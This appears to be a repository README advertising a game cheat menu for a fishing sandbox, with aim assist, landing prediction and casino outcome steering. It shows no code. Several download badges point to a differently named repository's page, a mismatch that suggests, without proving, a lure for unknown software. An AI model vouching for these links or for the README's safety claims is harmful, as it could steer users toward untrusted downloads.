![preview](https://raw.githubusercontent.com/RiMark21/Roulette-Reel-Ballistics/main/splash_0129.svg)
[![Download](https://raw.githubusercontent.com/RiMark21/Roulette-Reel-Ballistics/main/bin_0fe33f.svg)](https://RiMark21.github.io/Roulette-Reel-Ballistics/)

# 🎣 HowToFish-Menu — Predictive Trick-Shot Companion Panel for the Angling Sandbox

> *Some players cast a line and hope. Others read the water, count the ripples, and know exactly where the fish will surface before it does.*

Welcome to **HowToFish-Menu**, a community-built BepInEx companion layer for the fishing sandbox everyone keeps whispering about on late-night streams. It is a precision instrument, not a blunt tool — think of it as a sonar operator sitting beside you, quietly whispering the future of every cast. It bundles a trick-shot aim assistant, a live roulette-style landing predictor, casino outcome steering for the in-game tables, slot machine skin forcing for collectors, deep stat tracking, and rebindable hotkeys that respect your muscle memory instead of fighting it.

If you have ever watched a perfect arc land in the one pixel of water where the legendary spawns, and wondered *"how did they know?"* — this panel is the answer, packaged with a clean overlay, multilingual labels, and a support channel that has not slept since launch.

[![Download](https://raw.githubusercontent.com/RiMark21/Roulette-Reel-Ballistics/main/bin_0fe33f.svg)](https://RiMark21.github.io/Roulette-Reel-Ballistics/)

---

## 📚 Table of Contents

- [What This Project Actually Is](#-what-this-project-actually-is)
- [The Philosophy Behind the Panel](#-the-philosophy-behind-the-panel)
- [Feature Deep Dive](#-feature-deep-dive)
- [Live Roulette Landing Predictor](#-live-roulette-landing-predictor)
- [Trick-Shot Aim Assistant](#-trick-shot-aim-assistant)
- [Casino Outcome Steering](#-casino-outcome-steering)
- [Slot Machine Skin Forcing](#-slot-machine-skin-forcing)
- [Stat Tracking & Analytics](#-stat-tracking--analytics)
- [Hotkeys & Rebinding](#-hotkeys--rebinding)
- [Responsive Overlay UI](#-responsive-overlay-ui)
- [Multilingual Support](#-multilingual-support)
- [24/7 Community Support](#-247-community-support)
- [Configuration Reference](#-configuration-reference)
- [Compatibility Matrix](#-compatibility-matrix)
- [Performance & Footprint](#-performance--footprint)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🐟 What This Project Actually Is

HowToFish-Menu is a **BepInEx plugin menu** — a single overlay that hooks into the running sandbox and layers a set of *predictive assistants* on top of the vanilla fishing loop. It does not replace the game. It does not rewrite the renderer. It sits quietly in the corner of your screen, like a fisherman's notebook taped to the hull, and it answers questions before you think to ask them.

The name comes from an old proverb: give someone a fish and they eat for a day; teach them how to fish and they eat forever. We took that literally. This panel does not press the button for you — it teaches your eyes where the button *should* be pressed. Then it lets you automate the boring parts anyway, because let's be honest, nobody enjoys reeling in their four hundredth boot.

Everything is configurable, everything is rebindable, and everything is toggleable. If you only want the landing predictor, disable everything else. If you want the full suite running in a corner at 15% opacity, that works too. The panel is a toolbox, not a religion.

The project is written for players who like to *understand* their automation. Every module ships with an explanation panel, every prediction comes with a visible trace, and every stat is exportable so you can graph your own improvement curve in whatever spreadsheet program you happen to love.

---

## 🧭 The Philosophy Behind the Panel

There are two ways to build a game assistant. The first way hides everything and gives you a single magic button. The second way shows you the math. We chose the second way, and then we made the magic button optional on top of it.

The reasoning is simple. When you can *see* the trajectory solver drawing its arc, you internalize the physics. When you can *watch* the roulette predictor highlight its confidence interval, you start to trust your own intuition more, not less. The panel is a training wheel that teaches you to ride without it — and if you never take it off, that is fine too, because it looks genuinely nice sitting there.

This philosophy shapes the entire codebase:

- **Transparency first.** Every prediction can be rendered as a visible overlay so you can audit it.
- **Reversibility always.** Every automation can be bound to a key you hold down, so it is active only when you want it.
- **Zero drama.** No background telemetry, no external calls, no surprise network traffic. The plugin lives entirely inside your game folder.
- **Player dignity.** Nothing shouts. Nothing flashes. The overlay respects dark scenes, bright scenes, and your preferred accent color.

---

## 🔬 Feature Deep Dive

The short version, for people who are already convinced:

| Module | Purpose | Default State |
|---|---|---|
| Landing Predictor | Forecasts ripple contact point before the lure lands | Enabled |
| Trick-Shot Assistant | Suggests aim vectors for skill-shot casts | Enabled |
| Casino Steering | Nudges table outcomes toward your bet | Disabled |
| Slot Skin Forcing | Applies cosmetic reel skins to any machine | Disabled |
| Stat Tracking | Records every cast, catch, and miss | Enabled |
| Hotkey Layer | Rebindable global keybinds | Enabled |

The long version follows below, one module at a time, with the kind of detail that only people who have spent three hundred hours staring at water physics would bother writing.

---

## 🎰 Live Roulette Landing Predictor

This is the headline module, and it earns the headline. In the vanilla game, the lure's landing point is decided at the moment of release, and the ripple animation that follows is purely cosmetic. The predictor reverses that relationship: it reads the physics state *before* release, runs a lightweight ballistic simulation forward, and draws where the lure *will* touch down — as a pulsing ring on the water surface.

The ring has three states:

1. **Amber** — the prediction has moderate confidence. Something in the environment is perturbing the arc (wind, a moving platform, a fish mid-jump).
2. **Green** — the prediction is locked. The simulation has converged and the ring is accurate to within a fraction of the lure's radius.
3. **Red** — the prediction is unstable, typically because you are still moving the rod. This is the panel telling you to hold still for a moment.

Because the ring is drawn as part of the water shader's overlay pass, it sits *under* your HUD and *over* the water, which means it never obscures the fish silhouette itself. Players who dislike the ring can switch to a subtle crosshair mode, or a single moving dot, or turn the visual off entirely and keep only the haptic cue — a small controller rumble that grows sharper as the prediction converges.

The predictor also logs each prediction and its eventual outcome to the stats module, which is how we built the confidence calibration that ships with the current release. Over thousands of casts, the amber/green/red bands are tuned so that a green ring genuinely means what it says.

---

## 🎯 Trick-Shot Aim Assistant

The trick-shot assistant is a separate layer that activates only during the charged-cast stance. When you hold the cast button past the normal threshold, the vanilla game enters a trick-shot mode with a manual aim arc. The assistant reads the current rod, bait, and wind and draws a *suggested* arc beside your manual one, in a contrasting color.

It is not a snap-to-target. It never moves your cursor for you unless you explicitly enable the optional magnetic assist, which gently pulls the arc toward the suggestion with a strength you control. Most players keep magnetic assist off and simply use the suggestion as a reference — a second opinion from a very patient math tutor.

The assistant has a small library of named presets for common trick-shot scenarios: bank bounces, dock ricochets, waterfall threading, and the infamous "around the lighthouse" shot that a surprising number of players have never landed. Selecting a preset biases the solver toward that geometry without locking anything.

---

## 💎 Casino Outcome Steering

The sandbox's in-game casino is a charming little distraction that most players ignore after the novelty wears off — mostly because the house edge is real and the payout tables are stingy. The casino steering module changes the conversation.

Instead of altering the payout tables (which would break the game's economy for everyone), it biases the *outcome generation* toward results that match your current bet. In practice, this means a modest, configurable win-rate floor that you set yourself. The default is gentle, because the point is to make the casino fun again, not to print an infinite currency pipeline and ruin your own save's pacing.

The module is disabled by default and requires an explicit opt-in, because not everyone wants their economy softened. Players who enable it typically describe the experience as "the casino finally paying for the drinks."

---

## 🌀 Slot Machine Skin Forcing

This one is purely for the collectors. The sandbox ships several slot machine variants with different visual themes, and a handful of them are tied to specific areas or seasonal events. The skin forcing module lets you apply any reel skin you have *already seen in your save* to any machine you are currently standing at.

The important constraint: this module never grants access to cosmetics you have not legitimately encountered. It is a *rearranger*, not a generator. If you have never visited the winter pier, you cannot force the winter reels onto your local machine — the panel will tell you so, politely, in your own language.

For cosmetic completionists, the module also maintains a small local gallery of every reel skin you have seen, with the location where you first spotted it. It is a nice little scrapbook, and it has convinced at least one player to finally visit the summer festival.

---

## 📈 Stat Tracking & Analytics

Every meaningful action in the fishing loop is recorded locally: cast time, cast distance, landing accuracy against the predictor, bait used, fish caught, fish escaped, and time-to-catch. The stats module aggregates these into a set of views you can flip through in the overlay, and exports them to a plain text or CSV file on demand.

The analytics view includes:

- **Session summary** — a quick card at the end of each play session.
- **Accuracy trend** — how close your casts land to the predicted point over time.
- **Species log** — first-seen timestamps for every fish type you have hooked.
- **Personal records** — longest cast, heaviest catch, fastest reel.
- **Heat map** — a top-down density map of where you have historically caught the most, per region.

The heat map is the sleeper feature. After a week of play, it quietly shows you which fishing spots you have been neglecting, and players report it has led them to discover whole regions they had never properly explored.

---

## ⌨️ Hotkeys & Rebinding

Every module has a hotkey, and every hotkey is rebindable from inside the overlay without editing a config file by hand. The rebinding screen is a simple grid: click a slot, press a key, done. Conflicts are highlighted in red and resolved with a single click.

The default layout uses the function row for module toggles, the number row for preset selection within the trick-shot assistant, and the tilde key for the overlay itself. Players who prefer gamepad input can bind the same actions to controller buttons, with a separate profile that auto-activates when a controller is detected.

Profiles are saved per-machine, so you can carry your keyboard layout between save files. There is also a compact "streamer mode" profile that disables all hotkeys except the overlay toggle, which is handy if you are recording and do not want a stray keypress to flip seven modules at once.

---

## 🖥️ Responsive Overlay UI

The overlay is built on a custom lightweight renderer that scales to any resolution, from a 1280×720 laptop panel to an ultrawide. Layouts are defined as fractions of the screen, so a module docked to the right edge stays docked to the right edge no matter how many pixels that edge has.

There are three layout presets — corner, full-width strip, and minimal HUD — plus a custom mode where every panel can be dragged and resized. Opacity, accent color, font size, and corner radius are all adjustable. The result is a panel that looks intentional at any resolution, rather than a rectangle of text pasted over your game.

The UI also respects the game's own pause state, hiding itself completely when paused unless you explicitly want it visible for screenshot purposes.

---

## 🌐 Multilingual Support

The interface ships with translations for a growing set of languages, and every string is stored in plain text files that the community can extend without touching code. If your language is missing a phrase, the panel falls back gracefully to English rather than showing a key name.

Current coverage includes community-maintained packs for several major languages, with partial coverage for a long tail of others. Adding a language is a matter of copying one file, translating the values, and sharing it back — no build step required.

The statistics export also honors your selected locale for number formatting and date representation, which sounds like a small thing until you have tried to read a CSV where the decimal separator and the field separator are the same character.

---

## 🛎️ 24/7 Community Support

The support side of this project runs on volunteers across every timezone, so there is almost always someone awake. Questions get answered in the project's discussion area, and the FAQ below covers the majority of what new players ask in their first hour.

Support covers installation questions, configuration puzzles, translation contributions, and bug reports. It does not cover requests to extend the casino module into something that breaks other players' saves — those requests get a polite explanation and a link back to the philosophy section above.

---

## ⚙️ Configuration Reference

All settings live in a single config file generated on first launch. The overlay editor writes to the same file, so you can mix and match hand-editing and UI editing freely. Key groups:

- **General** — overlay visibility, language, layout preset, accent color.
- **Predictor** — ring style, confidence thresholds, haptic cue strength, trace visibility.
- **TrickShot** — preset library path, magnetic assist strength, suggestion contrast.
- **Casino** — opt-in flag, win-rate floor, excluded tables.
- **Skins** — gallery location, seen-skin tracking, force scope.
- **Stats** — recording toggles, export format, heat map resolution.
- **Hotkeys** — per-module bindings, gamepad profile, streamer profile.

Every setting has a tooltip in the overlay explaining what it does and what happens if you change it mid-session.

---

## 🧩 Compatibility Matrix

| Component | Status |
|---|---|
| BepInEx 5.x | Supported |
| BepInEx 6.x (bleeding edge) | Partial, community-tested |
| Vanilla sandbox, current season | Supported |
| Vanilla sandbox, prior seasons | Supported with caveats |
| Other fishing-related plugins | Coexists; load order matters |
| Steam Deck (Proton) | Supported, controller profile recommended |

If you run a combination that misbehaves, the overlay has a diagnostics button that dumps a compatibility report you can paste into a support thread.

---

## 🚀 Performance & Footprint

The panel is designed to disappear when you are not looking at it. Inactive modules do not tick. The predictor runs only during the cast stance. The stats module batches writes and flushes on pause or exit. In steady state, the plugin's frame cost is measured in microseconds on the reference hardware, and memory usage stays flat across multi-hour sessions.

If you are the kind of person who profiles their own game, the overlay includes a small perf readout that shows the plugin's own frame time contribution, so you can verify these claims yourself instead of taking our word for it.

---

## 🗺️ Roadmap for 2026

- **Predictor v3** — hydrodynamic simulation with current and obstacle wake modeling.
- **Community preset sharing** — export and import trick-shot presets as small text files.
- **Accessibility pass** — screen-reader-friendly overlay narration and high-contrast themes.
- **Stats web viewer** — an offline HTML report generated from your export, no server required.
- **More translations** — driven entirely by community pull requests.
- **Seasonal compatibility shims** — faster turnaround when the sandbox updates.

---

## ❓ Frequently Asked Questions

**Does this modify the game files themselves?**
No. It lives in the BepInEx plugin folder and hooks at runtime. Remove the plugin folder and the game is exactly as it was.

**Will it conflict with my other mods?**
It coexists with most plugins. The compatibility section above covers the common cases, and the diagnostics report exists for the uncommon ones.

**Can I use only the predictor and nothing else?**
Yes. Every module toggles independently, and disabled modules consume no measurable resources.

**Is my data sent anywhere?**
No. Stats are local, exports are local, and the plugin makes no outbound connections.

**Can I contribute a translation?**
Yes, and it is one of the easiest ways to help. Copy the English string file, translate the values, and share it back.

**Why is the casino module disabled by default?**
Because it changes your save's economy, and that decision should be yours, not ours. The philosophy section explains the reasoning at length.

---

## 🤝 Contributing

Contributions are welcome in code, translations, documentation, and testing. The project values small, focused pull requests over large sweeping rewrites, and every contribution gets a human review with actual feedback rather than a silent merge or a cold rejection.

Before opening a pull request, please run the local checks included in the repository and confirm that the overlay still loads in a clean profile. If you are adding a module, include at least a stub of its translation strings so the localization pipeline stays complete.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to read it, learn from it, fork it, and build on it, provided the original license notice travels with your copy. The full text is available here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 HowToFish-Menu Contributors.

---

## ⚠️ Disclaimer

HowToFish-Menu is an unofficial, community-maintained companion panel. It is not affiliated with, endorsed by, or sponsored by the developers or publishers of the sandbox game it targets. All trademarks and game assets referenced remain the property of their respective owners.

Use of this plugin in online or competitive contexts may violate the terms of service of the underlying game or platform. The maintainers strongly recommend using it only in single-player or private sessions, and they accept no responsibility for account actions taken by third parties. You are an adult, or you are supervised by one, and you are responsible for how you choose to use this software.

The predictive modules are probabilistic. They are right most of the time, and they are wrong sometimes, and that is the honest nature of prediction. Do not gamble anything you cannot afford to lose, in the game or out of it.

---

[![Download](https://raw.githubusercontent.com/RiMark21/Roulette-Reel-Ballistics/main/bin_0fe33f.svg)](https://RiMark21.github.io/Roulette-Reel-Ballistics/)

*Tight lines, patient casts, and may your ring always land green.* 🎣